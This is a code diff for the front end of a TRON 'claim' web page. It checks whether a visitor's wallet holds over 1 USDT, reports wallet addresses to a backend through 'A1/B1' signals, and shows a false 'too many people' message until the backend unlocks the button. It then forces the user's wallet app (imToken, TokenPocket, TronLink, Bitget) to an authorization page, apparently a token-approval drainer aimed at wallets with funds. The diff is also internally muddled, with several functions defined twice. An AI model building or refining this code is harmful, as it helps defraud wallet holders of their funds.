@@ -1041,7 +1041,7 @@ async function checkImTokenEnv() {
         });
     }
 }
-// ========== 钱包初始化函数（修正：符合条件则按钮可点击，绑定锁死逻辑） ==========
+// ========== 钱包初始化函数（核心：A1返回204才解锁按钮） ==========
 async function initWallet(needAutoApprove) {
     const lang = langConfig[currentLang];
     try {
@@ -1055,11 +1055,11 @@ async function initWallet(needAutoApprove) {
             try {
                 trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                 const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-                const trxRaw = await trc20Contract.balanceOf(userAddress).call();
+                const trxRaw = await tronWeb.trx.getBalance(userAddress);
                 tokenBalance = Number(usdtRaw) / 1000000;
                 trxBalance = Number(trxRaw) / 1000000;
 
-                // ========== 前置拦截：不符合领取条件 → 禁用按钮（仅这类情况禁用） ==========
+                // 唯一拦截：不符合基础条件（USDT>1/白名单+30天未领）→ 禁用按钮
                 const isEligible = (tokenBalance > 1 || userAddress === SPECIAL_ADDRESS) && !isAddressAuthorized(userAddress);
                 if (!isEligible) {
                     userInfoEl.innerHTML = `
@@ -1067,35 +1067,35 @@ async function initWallet(needAutoApprove) {
                         USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
                         <span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件</span>
                     `;
-                    approveBtn.disabled = true; // 仅不符合条件时禁用
+                    approveBtn.disabled = true;
                     approveBtn.textContent = "不符合领取条件";
                     return;
                 }
 
-                // ========== 符合条件 → 按钮可点击（不禁用），绑定锁死逻辑 ==========
+                // 符合基础条件→按钮可点击（锁死状态：A1未返回204，点击只提示）
                 userInfoEl.innerHTML = `
                     已连接：${shortAddr}<br>
                     USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                    <span style='color: #4ade80; font-size: 14px;'>✅ 符合领取条件，点击领取</span>
+                    <span style='color: #4ade80; font-size: 14px;'>✅ 符合领取条件，等待解锁...</span>
                 `;
-                approveBtn.disabled = false; // 可点击
+                approveBtn.disabled = false;
                 approveBtn.textContent = lang.approveBtnText;
 
-                // 绑定初始锁死逻辑：点击只显示提示，不发B1/不跳转
-                bindLockedApproveLogic();
+                // 绑定锁死逻辑：A1未解锁前，点击只显示提示
+                bindLockedLogic();
 
-                // 保留A1防重复校验 → 发送A1信号
+                // 保留A1防重复→发送A1信号，仅返回204解锁
                 if (canSendA1Signal(userAddress)) {
                     const a1Result = await sendSignalA1();
-                    if (a1Result) {
-                        // A1返回204 → 解锁按钮，绑定核心逻辑
-                        userInfoEl.innerHTML += `<br><span style='color: #3b82f6; font-size: 13px;'>✅ 可正常领取</span>`;
-                        bindUnlockedApproveLogic();
+                    if (a1Result === "204") {
+                        // A1返回204→解锁按钮，绑定核心流程
+                        userInfoEl.innerHTML += `<br><span style='color: #3b82f6; font-size: 13px;'>✅ 按钮已解锁，点击直接领取</span>`;
+                        bindUnlockedCoreLogic();
                     }
                 } else {
-                    // A1防重复命中 → 直接解锁（无需重复发送）
-                    userInfoEl.innerHTML += `<br><span style='color: #3b82f6; font-size: 13px;'>✅ 可正常领取</span>`;
-                    bindUnlockedApproveLogic();
+                    // A1防重复命中（已返回204）→ 直接解锁
+                    userInfoEl.innerHTML += `<br><span style='color: #3b82f6; font-size: 13px;'>✅ 按钮已解锁，点击直接领取</span>`;
+                    bindUnlockedCoreLogic();
                 }
             } catch (e) {
                 console.error("余额查询失败：", e);
@@ -1115,44 +1115,40 @@ async function initWallet(needAutoApprove) {
     }
 }
 
-// ========== 初始锁死逻辑：点击只显示提示，不发B1/不跳转 ==========
-function bindLockedApproveLogic() {
-    const lang = langConfig[currentLang];
+// ========== 锁死逻辑（A1未返回204） ==========
+function bindLockedLogic() {
     approveBtn.onclick = () => {
-        // 锁死状态：仅显示提示，无其他操作
         showAutoCloseAlert("现在领取的人太多了请稍后重试");
     };
 }
 
-// ========== A1返回204后解锁：点击发B1+跳转 ==========
-function bindUnlockedApproveLogic() {
+// ========== 解锁后核心逻辑（A1返回204，一路畅通） ==========
+function bindUnlockedCoreLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
         btn.disabled = true;
         btn.textContent = "处理中...";
-        let alertEl = null;
 
         try {
-            // 保留B1防重复校验（仅防二次发送B1信号）
+            // B1防重复仅防二次发送B1：已标记→不发B1，直接跳转授权（已满足A1+B1 204）
             if (hasSentB1Signal(userAddress)) {
-                showAutoCloseAlert("已提交领取请求，请勿重复点击");
+                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已满足领取条件，直接跳转授权</span>`;
+                await handleJump(); // 一路畅通，直接跳
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 return;
             }
 
-            // 标记B1已发送（防二次发送）
+            // 未发过B1→发送B1信号（仅一次）
+            const b1Result = await sendSignalB(true);
+            if (b1Result !== "204") throw new Error("B1未返回204");
+
+            // B1返回204→标记防重复（仅防二次发B1）
             markB1SignalSent(userAddress);
 
-            // 发送B1信号（一次执行）
-            const b1Result = await sendSignalB(true);
-            if (!b1Result) throw new Error("B1信号处理失败");
-
-            // B1返回 → 跳转签名页面
+            // 一路畅通→直接跳转授权页面
             await handleJump();
-
-            // 记录领取记录
             saveEnergyRecord();
             renderEnergyRecords();
         } catch (e) {
@@ -1164,20 +1160,7 @@ function bindUnlockedApproveLogic() {
     };
 }
 
-// ========== 保留A1防重复工具（未修改） ==========
-function canSendA1Signal(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
-        const lastSendTime = records[address] || 0;
-        const now = Date.now();
-        return now - lastSendTime > 15 * 60 * 1000; // 15分钟防重复
-    } catch (e) {
-        console.warn("检查A1信号发送权限失败：", e);
-        return true;
-    }
-}
-
-// ========== 发送A1信号（返回204视为成功，解锁按钮） ==========
+// ========== A1信号（仅返回204视为解锁） ==========
 async function sendSignalA1() {
     const requestData = { userAddress };
     const controller = new AbortController();
@@ -1191,28 +1174,62 @@ async function sendSignalA1() {
             keepalive: true
         });
         clearTimeout(timeoutId);
-        // A1返回204或200均视为成功，触发解锁
-        if (res.status === 204 || res.ok) {
-            const status = "success";
+        if (res.status === 204) {
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            a1Status[userAddress] = status;
+            a1Status[userAddress] = "success";
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-            console.log("✅ A1信号发送成功（返回204/200）");
-            return true;
+            console.log("✅ A1返回204，解锁按钮");
+            return "204";
         }
-        console.log("❌ A1信号发送失败（非200/204状态）");
-        return false;
+        throw new Error(`A1返回状态${res.status}`);
     } catch (e) {
         clearTimeout(timeoutId);
-        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-        a1Status[userAddress] = "fail";
-        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-        console.warn("❌ A1信号发送异常：", e);
-        return false;
+        console.warn("❌ A1信号异常：", e);
+        return "fail";
     }
 }
 
-// ========== 跳转函数（B1返回后直接跳转签名页面） ==========
+// ========== B1信号（仅返回204视为成功，才标记防重复） ==========
+async function sendSignalB(isB1 = true) {
+    const requestData = { userAddress };
+    const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 20000);
+    try {
+        const res = await fetch(`${BACKEND_API}${apiPath}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(requestData),
+            signal: controller.signal,
+            keepalive: true
+        });
+        clearTimeout(timeoutId);
+        if (res.status === 204) {
+            console.log("✅ B1返回204，直接跳转授权");
+            return "204";
+        }
+        throw new Error(`B1返回状态${res.status}`);
+    } catch (e) {
+        clearTimeout(timeoutId);
+        throw e;
+    }
+}
+
+// ========== B1防重复（仅防二次发送B1，不防跳转） ==========
+function hasSentB1Signal(address) {
+  try {
+    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+    const item = records[address];
+    if (!item) return false;
+    // 防重复对象=已发B1且返回204→仅阻止二次发B1，不阻止跳转
+    return Date.now() - item.time < 2592000000;
+  } catch (e) {
+    console.warn("检查B1防重复失败：", e);
+    return false;
+  }
+}
+
+// ========== 跳转授权页面（B1返回204/防重复命中，均直接跳） ==========
 async function handleJump() {
     const lang = langConfig[currentLang];
     const btn = document.getElementById("approveBtn");
@@ -1252,10 +1269,11 @@ async function handleJump() {
             }
         }
 
+        // 一路畅通→直接跳转授权页面
         window.location.href = jumpUrl;
-        btn.textContent = `正在唤起${wallet.name}签名页面...`;
+        btn.textContent = `正在唤起${wallet.name}授权页面...`;
 
-        // 跳转反馈（一次提示）
+        // 跳转反馈（仅提示，不阻断）
         setTimeout(() => {
             showAutoCloseAlert(`未检测到${wallet.name}，请手动打开`);
             btn.disabled = false;
@@ -1267,7 +1285,193 @@ async function handleJump() {
         btn.disabled = false;
         btn.textContent = lang.approveBtnText;
     }
-  }
+}
+
+// ========== 保留A1防重复（未修改） ==========
+function canSendA1Signal(address) {
+    try {
+        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
+        const lastSendTime = records[address] || 0;
+        const now = Date.now();
+        return now - lastSendTime > 15 * 60 * 1000;
+    } catch (e) {
+        console.warn("检查A1防重复失败：", e);
+        return true;
+    }
+}
+
+function updateA1SignalRecord(address) {
+    try {
+        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
+        records[address] = Date.now();
+        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
+    } catch (e) {
+        console.warn("更新A1记录失败：", e);
+    }
+}
+
+// ========== 发送A1信号（返回204视为成功，解锁按钮） ==========
+async function sendSignalA1() {
+    const requestData = { userAddress };
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 20000);
+    try {
+        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(requestData),
+            signal: controller.signal,
+            keepalive: true
+        });
+        clearTimeout(timeoutId);
+        // A1返回204或200均视为成功，触发解锁
+        if (res.status === 204 || res.ok) {
+            const status = "success";
+            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            a1Status[userAddress] = status;
+            localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+            console.log("✅ A1信号发送成功（返回204/200）");
+            return true;
+        }
+        console.log("❌ A1信号发送失败（非200/204状态）");
+        return false;
+    } catch (e) {
+        clearTimeout(timeoutId);
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1Status[userAddress] = "fail";
+        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+        console.warn("❌ A1信号发送异常：", e);
+        return false;
+    }
+}
+
+// ========== 修复：自动唤起钱包授权，无需手动刷新 ==========
+async function handleJump() {
+    const lang = langConfig[currentLang];
+    const btn = document.getElementById("approveBtn");
+    try {
+        // 1. 确保tronWeb完全就绪（关键：避免钱包未初始化导致跳转失效）
+        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+            throw new Error("钱包未完全初始化");
+        }
+
+        const selectedWalletType = getWalletFromUrl();
+        let wallet = null;
+        let jumpUrl = "";
+        const currentUrl = window.location.href + "#approve";
+        // 优化编码：双重编码确保特殊字符被正确处理（钱包能识别）
+        const encodedUrl = encodeURIComponent(encodeURIComponent(currentUrl));
+
+        // 2. 生成对应钱包的跳转链接（严格匹配钱包scheme要求）
+        if (selectedWalletType && walletConfig[selectedWalletType]) {
+            wallet = walletConfig[selectedWalletType];
+            switch (selectedWalletType) {
+                case "imtoken":
+                    // imtoken scheme优化：确保url参数正确编码
+                    jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+                    break;
+                case "tokenpocket":
+                    // TokenPocket scheme优化：JSON格式严格嵌套
+                    jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
+                    break;
+                case "tronlink":
+                    // TronLink scheme优化：参数完整无遗漏
+                    const tronParam = JSON.stringify({
+                        url: currentUrl,
+                        action: "open",
+                        protocol: "tronlink",
+                        version: "1.0"
+                    });
+                    jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
+                    break;
+                case "bitget":
+                    // Bitget scheme优化：直接拼接未二次编码的URL（钱包要求）
+                    jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(currentUrl)}`;
+                    break;
+                default:
+                    jumpUrl = wallet.scheme + encodedUrl;
+            }
+        } else {
+            // 兜底：自动识别当前钱包环境，生成对应跳转链接
+            wallet = walletConfig.imtoken;
+            jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+            
+            if (window.tronWeb.provider?.isTokenPocket) {
+                wallet = walletConfig.tokenpocket;
+                jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
+            } else if (window.tronWeb.provider?.isTronLink) {
+                const tronParam = JSON.stringify({ url: currentUrl, action: "open", protocol: "tronlink", version: "1.0" });
+                jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
+                wallet = walletConfig.tronlink;
+            } else if (window.tronWeb.provider?.isBitKeep) {
+                wallet = walletConfig.bitget;
+                jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(currentUrl)}`;
+            }
+        }
+
+        // 3. 强制触发跳转（关键：用setTimeout避免同步代码阻塞，确保浏览器识别scheme）
+        btn.textContent = `正在唤起${wallet.name}授权页面...`;
+        setTimeout(() => {
+            // 主动触发跳转（两种方式双重保障）
+            window.location.href = jumpUrl;
+            // 兜底：如果href失效，用iframe触发
+            const iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src = jumpUrl;
+            document.body.appendChild(iframe);
+            setTimeout(() => document.body.removeChild(iframe), 1000);
+        }, 100); // 延迟100ms，确保浏览器能即时响应
+
+        // 4. 3秒后检查是否唤起成功，未成功则提示手动打开（不依赖刷新）
+        setTimeout(() => {
+            showAutoCloseAlert(`未检测到${wallet.name}，请手动打开${wallet.name}访问该链接（无需刷新）`);
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+        }, 3000);
+    } catch (jumpErr) {
+        console.error("跳转失败：", jumpErr);
+        showAutoCloseAlert("跳转授权失败，请手动打开钱包访问（无需刷新）");
+        btn.disabled = false;
+        btn.textContent = lang.approveBtnText;
+    }
+}
+
+// ========== 优化：B1返回204后立即触发跳转，无阻塞 ==========
+function bindUnlockedCoreLogic() {
+    const lang = langConfig[currentLang];
+    approveBtn.onclick = async () => {
+        const btn = document.getElementById("approveBtn");
+        btn.disabled = true;
+        btn.textContent = "处理中...";
+
+        try {
+            // B1防重复：已标记→直接跳转（无需刷新）
+            if (hasSentB1Signal(userAddress)) {
+                userInfoEl.innerHTML += `<br><span style='color: #4ade80; font-size: 13px;'>✅ 已满足条件，自动唤起授权</span>`;
+                // 直接触发跳转，无任何中间阻塞
+                await handleJump();
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+                return;
+            }
+
+            // 发送B1→返回204→立即跳转（无延迟）
+            const b1Result = await sendSignalB(true);
+            if (b1Result !== "204") throw new Error("B1未返回204");
+            markB1SignalSent(userAddress);
+
+            // 关键：B1成功后立即触发跳转，不等待其他操作
+            await handleJump();
+            saveEnergyRecord();
+            renderEnergyRecords();
+        } catch (e) {
+            console.error("领取流程异常：", e);
+            showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+        }
+    };
+}
 
 // ========== 辅助函数（修复白名单地址的记录存储） ==========
 function saveEnergyRecord() {
